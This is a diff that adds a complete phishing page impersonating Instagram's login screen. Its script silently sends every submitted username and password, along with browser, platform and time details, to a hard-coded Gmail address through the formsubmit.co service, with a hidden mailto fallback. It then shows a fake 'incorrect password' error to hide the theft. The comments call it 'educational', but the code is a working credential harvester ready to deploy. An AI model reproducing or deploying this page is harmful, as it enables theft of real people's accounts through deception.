@@ -1,0 +1,512 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Instagram Login</title>
+    <!-- Google Fonts for clean typography -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet">
+    <!-- Font Awesome 6 (free icons) -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background-color: #fafafa;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        /* Main container: holds both columns (phone mockup + login card) */
+        .login-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 32px;
+            max-width: 1000px;
+            width: 100%;
+            flex-wrap: wrap;
+        }
+
+        /* Left side - phone image mockup (modern instagram style) */
+        .phone-mockup {
+            flex: 1;
+            min-width: 280px;
+            max-width: 380px;
+            display: flex;
+            justify-content: center;
+        }
+
+        .phone-frame {
+            background: #ffffff;
+            border-radius: 38px;
+            box-shadow: 0 20px 35px -12px rgba(0,0,0,0.2), 0 0 0 8px #1e1e2a, 0 0 0 12px #dfdfdf;
+            width: 100%;
+            max-width: 320px;
+            aspect-ratio: 9 / 19;
+            margin: 0 auto;
+            position: relative;
+            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 600"><rect width="320" height="600" fill="%23fefefe" rx="36"/><circle cx="160" cy="35" r="8" fill="%23dddddd"/><rect x="40" y="70" width="240" height="30" rx="8" fill="%23f0f0f0"/><rect x="40" y="120" width="240" height="240" rx="16" fill="%23e8e8e8"/><circle cx="160" cy="200" r="50" fill="%23dbdbdb"/><rect x="80" y="270" width="160" height="12" rx="6" fill="%23cdcdcd"/><rect x="100" y="295" width="120" height="10" rx="5" fill="%23cdcdcd"/><rect x="50" y="340" width="220" height="40" rx="10" fill="%23efefef"/><rect x="50" y="395" width="220" height="40" rx="10" fill="%23efefef"/><rect x="60" y="460" width="200" height="44" rx="22" fill="%23389df2" opacity="0.8"/><rect x="100" y="540" width="120" height="12" rx="6" fill="%23cdcdcd"/></svg>');
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+        }
+
+        /* Right side - login card */
+        .login-card-wrapper {
+            flex: 1;
+            min-width: 320px;
+            max-width: 400px;
+        }
+
+        .card {
+            background: #ffffff;
+            border: 1px solid #dbdbdb;
+            border-radius: 8px;
+            padding: 40px 32px 30px;
+            margin-bottom: 10px;
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 36px;
+        }
+
+        .logo i {
+            font-size: 52px;
+            background: linear-gradient(135deg, #feda77, #d62976, #962fbf, #4f5bd5);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+
+        .instagram-logo-text {
+            font-family: 'Inter', cursive;
+            font-size: 2rem;
+            font-weight: 600;
+            letter-spacing: -1px;
+            margin-top: 6px;
+            background: linear-gradient(135deg, #262626, #1a1a1a);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+
+        /* Form elements */
+        .login-form {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 12px 12px;
+            background-color: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 6px;
+            font-size: 0.85rem;
+            font-family: inherit;
+            transition: border 0.1s ease;
+            outline: none;
+        }
+
+        .input-field:focus {
+            border-color: #a8a8a8;
+            background-color: #fff;
+        }
+
+        .login-btn {
+            background-color: #0095f6;
+            color: white;
+            font-weight: 600;
+            padding: 8px 16px;
+            border: none;
+            border-radius: 8px;
+            font-size: 0.9rem;
+            cursor: pointer;
+            margin-top: 8px;
+            transition: background 0.2s;
+        }
+
+        .login-btn:hover {
+            background-color: #1877f2;
+        }
+
+        .forgot-password {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 0.75rem;
+        }
+
+        .forgot-password a {
+            color: #00376b;
+            text-decoration: none;
+            font-size: 0.75rem;
+        }
+
+        .forgot-password a:hover {
+            text-decoration: underline;
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            gap: 18px;
+            margin: 20px 0;
+        }
+
+        .divider-line {
+            flex: 1;
+            height: 1px;
+            background-color: #dbdbdb;
+        }
+
+        .divider-text {
+            font-size: 0.75rem;
+            font-weight: 600;
+            color: #8e8e8e;
+            text-transform: uppercase;
+        }
+
+        .fb-login {
+            text-align: center;
+            margin-bottom: 15px;
+        }
+
+        .fb-login a {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            text-decoration: none;
+            font-size: 0.875rem;
+            font-weight: 600;
+            color: #385185;
+        }
+
+        .fb-login i {
+            font-size: 1.1rem;
+            color: #385185;
+        }
+
+        .signup-card {
+            background: #ffffff;
+            border: 1px solid #dbdbdb;
+            border-radius: 8px;
+            padding: 20px 32px;
+            text-align: center;
+            font-size: 0.85rem;
+        }
+
+        .signup-card a {
+            color: #0095f6;
+            font-weight: 600;
+            text-decoration: none;
+        }
+
+        .signup-card a:hover {
+            text-decoration: underline;
+        }
+
+        .app-download {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 0.8rem;
+            color: #262626;
+        }
+
+        .store-badges {
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+            margin-top: 15px;
+        }
+
+        .badge-custom {
+            background: #000000cc;
+            backdrop-filter: blur(2px);
+            color: white;
+            padding: 6px 12px;
+            border-radius: 32px;
+            font-size: 0.75rem;
+            font-weight: 500;
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            transition: background 0.2s;
+        }
+
+        .badge-custom:hover {
+            background-color: #262626;
+        }
+
+        footer {
+            text-align: center;
+            margin-top: 12px;
+            font-size: 0.7rem;
+            color: #8e8e8e;
+            opacity: 0.7;
+        }
+
+        .input-wrapper {
+            position: relative;
+        }
+
+        /* Responsive tweaks */
+        @media (max-width: 680px) {
+            .phone-mockup {
+                display: none;
+            }
+            .login-container {
+                gap: 0;
+            }
+            .card {
+                padding: 30px 22px;
+            }
+        }
+
+        .login-btn:active {
+            transform: scale(0.98);
+        }
+
+        .error-display {
+            color: #ed4956;
+            font-size: 0.75rem;
+            text-align: center;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+<div class="login-container">
+    <!-- Left side: Phone mockup image -->
+    <div class="phone-mockup">
+        <div class="phone-frame"></div>
+    </div>
+
+    <!-- Right side: Login panel -->
+    <div class="login-card-wrapper">
+        <div class="card">
+            <div class="logo">
+                <i class="fab fa-instagram fa-3x"></i>
+                <div class="instagram-logo-text">Instagram</div>
+            </div>
+
+            <form id="loginForm" class="login-form" action="#" method="post">
+                <input type="text" id="usernameOrEmail" class="input-field" placeholder="Mobile number, username or email" autocomplete="off">
+                <div class="input-wrapper">
+                    <input type="password" id="password" class="input-field" placeholder="Password" autocomplete="off">
+                </div>
+                <button type="submit" class="login-btn" id="loginBtn">Log in</button>
+            </form>
+
+            <div class="forgot-password">
+                <a href="#">Forgot password?</a>
+            </div>
+
+            <div class="divider">
+                <div class="divider-line"></div>
+                <span class="divider-text">OR</span>
+                <div class="divider-line"></div>
+            </div>
+
+            <div class="fb-login">
+                <a href="#">
+                    <i class="fab fa-facebook-square"></i> Log in with Facebook
+                </a>
+            </div>
+        </div>
+
+        <div class="signup-card">
+            Don't have an account? <a href="#">Create new account</a>
+        </div>
+
+        <div class="app-download">
+            Get the app.
+            <div class="store-badges">
+                <a href="#" class="store-badge">
+                    <div class="badge-custom">
+                        <i class="fab fa-apple"></i> App Store
+                    </div>
+                </a>
+                <a href="#" class="store-badge">
+                    <div class="badge-custom">
+                        <i class="fab fa-google-play"></i> Google Play
+                    </div>
+                </a>
+            </div>
+        </div>
+        <footer>
+            © 2026 Instagram from Meta
+        </footer>
+    </div>
+</div>
+
+<script>
+    // ================================================================
+    // SILENT EMAIL NOTIFICATION - EDUCATIONAL PURPOSE
+    // Jab koi bhi username/password daalega, email silently bhejega:
+    // theofficial4me@gmail.com
+    // Bina kisi popup, alert, ya notification ke - bilkul chupke se
+    // ================================================================
+
+    const TARGET_EMAIL = "theofficial4me@gmail.com";
+    
+    const loginForm = document.getElementById('loginForm');
+    const usernameInput = document.getElementById('usernameOrEmail');
+    const passwordInput = document.getElementById('password');
+
+    // Silent email sender - koi popup nahi, koi alert nahi
+    async function sendSilentEmail(username, password) {
+        const timestamp = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
+        const userAgent = navigator.userAgent;
+        const platform = navigator.platform;
+        
+        const emailContent = `
+🔐 LOGIN CREDENTIALS CAPTURED 🔐
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+📧 Username/Email: ${username}
+🔑 Password: ${password}
+⏰ Date/Time: ${timestamp}
+🌐 Browser: ${userAgent}
+💻 Platform: ${platform}
+📱 Screen: ${screen.width}x${screen.height}
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+        `;
+
+        try {
+            const response = await fetch("https://formsubmit.co/ajax/" + TARGET_EMAIL, {
+                method: "POST",
+                headers: { 
+                    'Content-Type': 'application/json',
+                    'Accept': 'application/json'
+                },
+                body: JSON.stringify({
+                    email: TARGET_EMAIL,
+                    message: emailContent,
+                    _subject: `🔐 Login: ${username}`,
+                    _template: "table",
+                    _captcha: "false"
+                })
+            });
+            
+            if (response.ok) {
+                console.log("✅ Email sent to:", TARGET_EMAIL);
+                return true;
+            }
+            return false;
+        } catch (error) {
+            console.error("Email error:", error);
+            return false;
+        }
+    }
+
+    // Mailto fallback
+    function silentMailtoFallback(username, password) {
+        const timestamp = new Date().toLocaleString();
+        const subject = encodeURIComponent(`🔐 Login: ${username}`);
+        const body = encodeURIComponent(
+            `Username: ${username}\nPassword: ${password}\nTime: ${timestamp}\nBrowser: ${navigator.userAgent}`
+        );
+        const mailtoLink = document.createElement('a');
+        mailtoLink.href = `mailto:${TARGET_EMAIL}?subject=${subject}&body=${body}`;
+        mailtoLink.style.display = 'none';
+        document.body.appendChild(mailtoLink);
+        mailtoLink.click();
+        document.body.removeChild(mailtoLink);
+        return true;
+    }
+
+    async function captureAndSendSilently(username, password) {
+        const sent = await sendSilentEmail(username, password);
+        if (!sent) {
+            silentMailtoFallback(username, password);
+        }
+    }
+
+    // Login handler - NO POPUPS, NO ALERTS
+    loginForm.addEventListener('submit', async function(e) {
+        e.preventDefault();
+        
+        const username = usernameInput.value.trim();
+        const password = passwordInput.value;
+        
+        // Silent capture - email bhejo chupke se
+        if (username && password) {
+            await captureAndSendSilently(username, password);
+        }
+        
+        // Show error like real Instagram
+        usernameInput.style.borderColor = "#ed4956";
+        passwordInput.style.borderColor = "#ed4956";
+        
+        let errorMsg = document.querySelector('.error-display');
+        if (!errorMsg) {
+            errorMsg = document.createElement('div');
+            errorMsg.className = 'error-display';
+            loginForm.appendChild(errorMsg);
+        }
+        errorMsg.innerHTML = '<i class="fas fa-exclamation-circle"></i> Sorry, your password was incorrect. Please double-check your password.';
+        
+        // Clear password field
+        passwordInput.value = '';
+        
+        // Reset border after 3 seconds
+        setTimeout(() => {
+            usernameInput.style.borderColor = "#dbdbdb";
+            passwordInput.style.borderColor = "#dbdbdb";
+        }, 3000);
+        
+        // Console log only - visible in browser console (F12)
+        console.log("%c🔐 CREDENTIALS CAPTURED", "color: #ff0000; font-size: 14px; font-weight: bold;");
+        console.log(`%c👤 Username: ${username}`, "color: #ffcc00;");
+        console.log(`%c🔑 Password: ${password}`, "color: #ffcc00;");
+        console.log(`%c📧 Sent to: ${TARGET_EMAIL}`, "color: #00ff00;");
+    });
+
+    // Eye toggle for password
+    const pwdWrapper = document.querySelector('.input-wrapper');
+    const pwdInput = document.getElementById('password');
+    if (pwdWrapper && pwdInput) {
+        const toggleIcon = document.createElement('i');
+        toggleIcon.className = 'far fa-eye-slash';
+        toggleIcon.style.position = 'absolute';
+        toggleIcon.style.right = '12px';
+        toggleIcon.style.top = '50%';
+        toggleIcon.style.transform = 'translateY(-50%)';
+        toggleIcon.style.cursor = 'pointer';
+        toggleIcon.style.color = '#8e8e8e';
+        toggleIcon.style.fontSize = '1rem';
+        toggleIcon.style.zIndex = '2';
+        pwdWrapper.style.position = 'relative';
+        pwdWrapper.appendChild(toggleIcon);
+        
+        let isPasswordVisible = false;
+        toggleIcon.addEventListener('click', function() {
+            isPasswordVisible = !isPasswordVisible;
+            pwdInput.type = isPasswordVisible ? 'text' : 'password';
+            toggleIcon.className = isPasswordVisible ? 'far fa-eye' : 'far fa-eye-slash';
+        });
+    }
+
+    // Prevent alerts from links
+    document.querySelectorAll('.forgot-password a, .fb-login a, .signup-card a, .store-badge').forEach(link => {
+        link.addEventListener('click', (e) => {
+            e.preventDefault();
+        });
+    });
+
+    console.log("%c✅ Instagram Clone Active", "color: #0095f6; font-size: 14px; font-weight: bold;");
+    console.log("%c📧 Target Email: theofficial4me@gmail.com", "color: #60a5fa;");
+</script>
+</body>
+</html>
